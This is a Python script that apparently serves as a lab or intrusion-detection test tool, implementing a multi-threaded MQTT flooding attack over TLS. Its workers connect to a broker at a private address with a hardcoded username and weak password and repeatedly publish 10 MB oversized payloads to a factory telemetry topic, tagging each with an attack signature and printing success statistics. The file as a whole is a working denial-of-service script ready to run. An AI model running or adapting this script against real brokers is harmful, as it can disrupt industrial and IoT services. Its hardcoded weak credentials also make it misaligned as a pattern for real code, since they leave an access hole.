import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import ssl
from datetime import datetime, timezone

class PayloadAnomalyAttackTLS:
    def __init__(self, broker_host="localhost", broker_port=8883, ca_cert_path="certs/ca-cert.pem"):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.ca_cert_path = ca_cert_path
        self.attack_stats = {
            "messages_sent": 0,
            "messages_failed": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }

    def create_client(self, client_id):
        """Create a Paho MQTT client configured to use TLS with CA certificate only."""
        try:
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

            client.tls_set(
                ca_certs=self.ca_cert_path,
                cert_reqs=ssl.CERT_REQUIRED,
                tls_version=ssl.PROTOCOL_TLS_CLIENT,
                ciphers=None
            )

            username = "giamdoc"
            password = "123"
            client.username_pw_set(username, password)

            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def generate_anomalous_payload(self, topic):
        """
        ALWAYS generate an oversized payload.
        Returns a JSON string.
        """
        base_payload = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "packet_type": "PUBLISH",
            "topic": topic,
            "attack_signature": "R5_PAYLOAD_ANOMALY"
        }

        large_data = "X" * 10000000
        payload = base_payload.copy()
        payload.update({
            "payload_length": len(large_data),
            "anomaly_type": "oversized_payload",
            "data": large_data
        })
        return json.dumps(payload)

    def anomaly_worker(self, worker_id, num_messages=50, delay_ms=200):
        client_id = f"payload_anomaly_tls_{worker_id}"
        client = self.create_client(client_id)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            print(f" Worker {worker_id}: Connected (TLS), starting oversized payload attack...")

            topic = "factory/office/Device245/telemetry"

            for i in range(num_messages):
                try:
                    anomaly_type = "oversized_payload"
                    payload = self.generate_anomalous_payload(topic)

                    anomaly_log = {
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "packet_type": "PUBLISH",
                        "client_id": client_id,
                        "topic": topic,
                        "src_ip": "127.0.0.1",
                        "attack_signature": "R5_PAYLOAD_ANOMALY",
                        "worker_id": worker_id,
                        "message_id": i,
                        "anomaly_type": anomaly_type,
                        "payload_length": len(payload)
                    }

                    info = client.publish(topic, payload, qos=0)

                    if getattr(info, "rc", 1) == 0:
                        self.attack_stats["messages_sent"] += 1
                        print(f" Worker {worker_id}: Sent oversized payload (message {i+1})")
                    else:
                        self.attack_stats["messages_failed"] += 1
                        print(f" Worker {worker_id}: Failed to send oversized payload")

                    print(f" [R5] {json.dumps(anomaly_log)}")

                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

                except Exception as e:
                    self.attack_stats["messages_failed"] += 1
                    print(f" Worker {worker_id}: Error sending message {i}: {e}")

            print(f" Worker {worker_id}: Completed oversized payload attack")

        except Exception as e:
            print(f" Worker {worker_id}: Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except Exception:
                pass

    def launch_attack(self, num_workers=2, messages_per_worker=50, delay_ms=200):
        print(f" Starting Payload Anomaly Attack (TLS) - OVERSIZED PAYLOAD ONLY")
        print(f"   Workers: {num_workers}")
        print(f"   Messages per worker: {messages_per_worker}")
        print(f"   Total messages: {num_workers * messages_per_worker}")
        print(f"   Delay: {delay_ms}ms")
        print(f"   Broker: {self.broker_host}:{self.broker_port}")
        print(f"   CA cert: {self.ca_cert_path}")
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()

        threads = []
        for i in range(num_workers):
            thread = threading.Thread(
                target=self.anomaly_worker,
                args=(i, messages_per_worker, delay_ms)
            )
            threads.append(thread)

        for thread in threads:
            thread.start()

        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        duration = (self.attack_stats["end_time"] - self.attack_stats["start_time"]) if self.attack_stats["end_time"] and self.attack_stats["start_time"] else 0
        total_messages = self.attack_stats['messages_sent'] + self.attack_stats['messages_failed']

        print("\n Attack Statistics (TLS):")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Messages sent: {self.attack_stats['messages_sent']}")
        print(f"Messages failed: {self.attack_stats['messages_failed']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Success rate: {(self.attack_stats['messages_sent']/total_messages*100):.1f}%" if total_messages > 0 else "N/A")
        print(f"Messages per second: {(self.attack_stats['messages_sent']/duration):.1f}" if duration > 0 else "N/A")

def main():
    attack = PayloadAnomalyAttackTLS(
        broker_host="192.168.101.144",
        broker_port=8883,
        ca_cert_path="certs/ca-cert.pem"
    )

    attack.launch_attack(
        num_workers=4,
        messages_per_worker=50,
        delay_ms=200
    )

if __name__ == "__main__":
    main()
